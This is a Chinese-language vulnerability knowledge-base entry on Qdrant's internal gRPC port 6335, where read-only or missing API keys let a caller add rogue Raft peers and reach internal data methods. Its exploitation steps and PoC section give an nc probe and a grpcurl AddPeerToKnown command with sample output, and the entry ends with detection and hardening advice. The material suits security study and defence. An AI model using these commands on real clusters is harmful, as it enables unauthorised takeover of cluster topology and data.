---
id: web-generic-auth-qdrant-internal-grpc-auth-bypass
title: Qdrant 分布式内部 6335 gRPC 认证缺陷：只读 key 或匿名可改集群拓扑
type: scenario
domain: web
path: web/generic/auth
technique: vector-db-internal-auth-bypass
aliases:
- Qdrant 6335 未授权
- Qdrant 只读 key 越权
- AddPeerToKnown
- 向量库内部端口认证
- GHSA-3gph-6c29-p29v
- GHSA-frc7-44gm-99qq
tags:
- qdrant
- grpc
- auth-bypass
- vector-database
- raft
- cluster
- internal-api
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
affected_versions: 'GHSA-3gph-6c29-p29v: 1.18.0–1.19.1（1.19.2 修复）；GHSA-frc7-44gm-99qq: 1.20.0 以前（1.20.0 修复）；1.20.0 无 api_key 时内部端口仍无认证'
verification:
  verified_by: verifier-C
  verified_at: '2026-11-04T19:20:38+08:00'
  notes: 已对照原文与9张内联图核对：1.19.1 只读 key 可调 AddPeerToKnown、1.19.2 拒绝只读 key/JWT、1.20.0 默认 enforce 但无 api_key 时匿名可加 peer 并写 PointsInternal、message_send_failures 增长、/cluster 视图均一致；版本按原文写入。JWT 未单独复测（原文亦未复测），PoC 未执行
---

## 一句话结论

Qdrant 分布式集群的内部 gRPC 端口 6335 复用公共 API 的凭证体系，且 Raft 的 `AddPeerToKnown` 不经过存储层 RBAC：1.19.1 及以前只读 key 就能添加任意 peer；1.20.0 虽然默认强制内部认证，但只要集群没配 `api_key`，该端口对匿名请求完全开放，可改拓扑、读写数据。

## 原理

- 6335 只在 `cluster.enabled=true` 时启动，用于 Raft、分片转移和遥测；内部监听默认跟随 `service.host`（`0.0.0.0`），能访问 6333 的机器通常也能访问 6335。
- 内部端口与公共 6333/6334 共用同一套 `api_key`/只读 key/JWT。认证层只判断“凭证是否合法”，具体权限检查在存储层 `lib/storage/.../rbac/ops_checks.rs`。
- `Raft/AddPeerToKnown` 收到请求后直接推进共识，不进入 TableOfContent，因此不触发存储层 RBAC；只读 key 在 1.19.1 及以前能通过认证层，于是可以修改集群拓扑。
- 1.19.2 把内部 API 的白名单收紧为仅接受读写 `api_key`/`alt_api_key`，只读 key 与 JWT 被拒；但存储层权限逻辑未变。
- 1.20.0 把 `enforce_internal_auth` 默认值改为 true，但强制的前提是“存在一个 key 可比对”。没有配置 `api_key` 的分布式集群启动时只打印警告，内部端口没有任何认证，匿名即可调用 Raft、`PointsInternal`、`QdrantInternal/GetTelemetry` 等方法。
- 内部端口默认不开 TLS，key 在网络中明文传输；1.20.0 也未引入内部端口消息大小限制。

## 触发条件

- Qdrant 以分布式集群运行（单机不启动 6335）；
- 攻击者所处网络能访问 6335（同网段容器、同 VPC 跳板机、host 网络、端口范围映射、K8s headless service 等）；
- 满足任一版本/配置条件：
  - 1.18.0–1.19.1：配置了 enforce_internal_auth 与只读 key，只读 key 可调内部写方法；
  - 1.20.0 以前：未开启 enforce_internal_auth，匿名可调；
  - 任意版本（含 1.20.0）：集群未配置 `api_key`，内部端口无认证。

## 利用步骤

1. 访问 6333 根路径读取 `version`，确认是否分布式（`/cluster` 返回 `status: enabled`）；
2. 从非集群成员机器探测 6335 是否可达（`nc -zv host 6335`）；
3. 准备 Qdrant 的 proto 文件（服务未开 gRPC reflection，必须自带 `raft_service.proto` 等）；
4. 用匿名或只读 key 调用 `qdrant.Raft/AddPeerToKnown`，填入自己控制的地址、端口和未占用的 uint64 id；
5. 用管理 key 查 `/cluster`，确认新 peer 出现在 `peers` 且 `raft_info.commit` 增长；
6. 进一步调用 `QdrantInternal/GetTelemetry`、`PointsInternal/Upsert` 等验证读写能力。

## PoC

```bash
grpcurl -plaintext \
  -import-path ./proto -proto raft_service.proto \
  -H "api-key: ro-key-123" \
  -d '{"uri":"http://172.31.0.9:6335","port":6335,"id":99}' \
  172.31.0.2:6335 qdrant.Raft/AddPeerToKnown
```

无 key 的 1.20.0 集群去掉 `-H` 同样成功。返回的 `allPeers` 会包含：

```json
{"uri":"http://172.31.0.9:6335/","id":"99"}
```

`/cluster` 视图可确认：

```json
{"status":"enabled","peers":{"...":"...","99":{"uri":"http://172.31.0.9:6335/"}},
 "raft_info":{"commit":8,"leader":"..."},"message_send_failures":{"http://172.31.0.9:6335/":{"count":31}}}
```

`message_send_failures` 计数持续增长，说明集群在真正向该地址发送 Raft 消息。

## 变体与关联

- 变体：只读 key 越权（1.18.0–1.19.1）；未开 enforce 的匿名访问（1.20.0 以前）；无 api_key 的匿名访问（含 1.20.0）；JWT 在 1.19.2 前同样可进内部端口。
- 关联：[[ai-security-rag-security-qdrant-fake-peer-vector-exfil]]（利用本认证缺陷注册伪节点窃取向量数据）。
- 注意：两个 GHSA 均未分配 CVE；版本与修复时间以官方 advisory 为准。

## 检测与防御

- 检测：`/cluster` 中出现未知 peer id/URI；`message_send_failures` 指向陌生地址；6335 出现非集群节点连接；启动日志出现 `Running in distributed mode without an API key`。
- 网络层：用安全组/NetworkPolicy 把 6335 限制在集群节点之间；确认能访问 6333 的应用主机访问不到 6335。
- 配置：升级到 1.20.0+；每个节点配置强 `api_key`；开启 `cluster.p2p.enable_tls`；无法升级时用 `cluster.p2p.host` 把内部端口绑定到内网地址。
- 权限：内部端口只接受管理 key 是设计限制，无法给内部通信单独发最小权限钥匙；应把节点视为高价值资产，限制其出网与横向可达性。
